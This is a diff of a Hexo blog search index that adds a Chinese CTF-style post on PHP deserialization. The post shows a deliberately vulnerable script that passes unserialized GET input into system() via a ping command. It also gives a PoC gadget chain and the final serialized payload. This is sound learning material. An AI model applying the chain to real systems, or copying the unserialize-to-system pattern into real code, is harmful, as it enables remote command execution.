@@ -6,22 +6,6 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>gh3</title>
-    <url>/2024/06/22/gh3/</url>
-    <content><![CDATA[<h4 id="hhhh"><a href="#hhhh" class="headerlink" title="hhhh"></a>hhhh</h4><ul>
-<li>gh3</li>
-<li>gh4</li>
-</ul>
-]]></content>
-      <categories>
-        <category>categories</category>
-      </categories>
-      <tags>
-        <tag>踩坑</tag>
-        <tag>hhh</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/2024/06/21/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -40,14 +24,37 @@
 ]]></content>
   </entry>
   <entry>
-    <title>post</title>
-    <url>/2024/06/22/post/</url>
-    <content><![CDATA[<p>111111111</p>
+    <title>php反序列化小战</title>
+    <url>/2024/07/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E6%88%98/</url>
+    <content><![CDATA[<h3 id="php反序列触发想ping的ip："><a href="#php反序列触发想ping的ip：" class="headerlink" title="php反序列触发想ping的ip："></a>php反序列触发想ping的ip：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">getip</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ip = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;The ip is&#x27;</span>.<span class="variable language_">$this</span>-&gt;ip;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">         </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">getresult</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ip = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ip;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ping</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$ip</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$str</span> = <span class="string">&#x27;ping &#x27;</span>.<span class="variable language_">$this</span>-&gt;ip;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$str</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]));</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>可以看到ping这个类里存在system执行，getresult类里有调用这个类的魔术方法，”__toString()”在将对象作为字符串时自动调用,所以结论就是：</p>
+<ul>
+<li><p>ip–&gt;ping–&gt;getresult–&gt;$obj–&gt;getip</p>
+</li>
+<li><p>poc为:</p>
+  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getresult</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ping</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$ip</span>=<span class="string">&quot;192.168.77.141&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">getresult</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ping</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">getip</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;obj=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;ip=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>结果为：<span style="color: #000000;">O:5:”getip”:1:{s:2:”ip”;O:9:”getresult”:2:{s:3:”obj”;O:4:”ping”:1:{s:8:”pingip”;s:14:”192.168.77.141”;}s:2:”ip”;N;}}</span></p>
+</li>
+<li><p><span style="color: #000000;">值得注意的是：ping中的ip参数的属性为私有属性，我们应该在 Modifier的两边加上 %00 再将其填写到url中去，最终poc为：</span></p>
+<ul>
+<li><span style="color: #000000;">O:5:”getip”:1:{s:2:”ip”;O:9:”getresult”:2:{s:3:”obj”;O:4:”ping”:1:{s:8:”%00ping%00ip”;s:14:”192.168.77.141”;}s:2:”ip”;N;}}</span></li>
+</ul>
+</li>
+<li><p><span style="color: #000000;">最终传入参数后成功ping了我们输入的ip地址：</span><span style="color: #000000;"><img src="/2024/07/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E6%88%98/test1.png" alt="test1.png"></span></p>
+</li>
+<li><p>其他补充：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Public(公有):被序列化时属性值为：属性名  </span><br><span class="line">Protected(受保护):被序列化时属性值为：\\x00\*\\x00属性名,url中就为%00</span><br><span class="line">Private(私有):被序列化时属性值为：\\x00类名\\x00属性名</span><br><span class="line">魔术方法：</span><br><span class="line">__construct()，类的构造函数，只有在new 一个对象的时候会触发，在serialize 序列化和unserialize反序列化中都不会触发</span><br><span class="line">__destruct()，类的析构函数，在对象销毁和serialize 反序列化的情况下会被触发</span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用</span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用</span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure>
 ]]></content>
       <tags>
-        <tag>踩坑</tag>
-        <tag>tags</tag>
-        <tag>hhhh</tag>
+        <tag>反序列化</tag>
+        <tag>CTF</tag>
+        <tag>php</tag>
       </tags>
   </entry>
 </search>
